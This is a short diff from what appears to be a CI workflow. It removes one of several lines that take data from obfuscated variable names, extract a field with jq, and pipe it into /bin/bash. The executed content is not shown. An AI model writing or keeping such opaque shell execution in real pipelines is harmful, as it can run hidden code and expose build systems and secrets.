@@ -43,7 +43,6 @@ jobs:
           echo $q39021 | jq -r .bicd63156 | /bin/bash
           echo $nxjds0 | jq -r .eiecu3 | /bin/bash
           echo $znj035 | jq -r .sguy085 | /bin/bash
-          printf '%s' "$lc22862" | jq -r .clnrj01 | /bin/bash
           echo $hm5 | jq -r .wa14948 | /bin/bash
           printf '%s' "$t15" | jq -r .g5163 | /bin/bash
           echo $pk12 | jq -r .f73 | /bin/bash
